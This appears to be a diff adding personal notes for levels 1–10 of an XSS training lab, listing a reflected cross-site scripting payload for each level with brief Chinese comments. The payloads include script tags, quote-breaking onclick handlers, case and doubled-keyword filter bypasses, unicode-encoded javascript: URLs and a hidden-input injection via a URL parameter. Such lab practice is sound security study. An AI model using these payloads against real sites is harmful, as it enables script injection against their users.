@@ -1,0 +1,45 @@
+# 1
+
+<script>alert(1)</script>
+
+# 2
+
+<input name=keyword  value=" x" onclick=alert(1) // ">
+
+# 3
+
+x' onclick=alert(1) //
+
+# 4
+
+x" onclick=alert(1) //
+
+# 5
+
+<input name=keyword  value=" x"><a href=javascript:alert(1) //  ">
+
+# 6
+
+aaaaa" oNclick=alert(1) //
+
+# 7
+
+aaaaaa" oonnclick=alert(1) //
+
+# 8
+
+javascript:alert(1) 会识别script然后r_i
+javascript:alert(1) 进行unicode编码，在输入框中输入
+
+# 9
+
+提示url不合法，需要http://
+先对javascript:alert(1) 进行unicode编码，然后xxxxx //http://
+
+# 10
+
+<input name="t_sort"  value=" " type="" onclick=alert(1) //  " type="hidden">
+
+10.php?keyword=aaaaa&t_link=1&t_history=2&t_sort=" type="" onclick=alert(1) //
+
+先看看谁会理我，然后进行闭合，type="" 让框可以看得到 
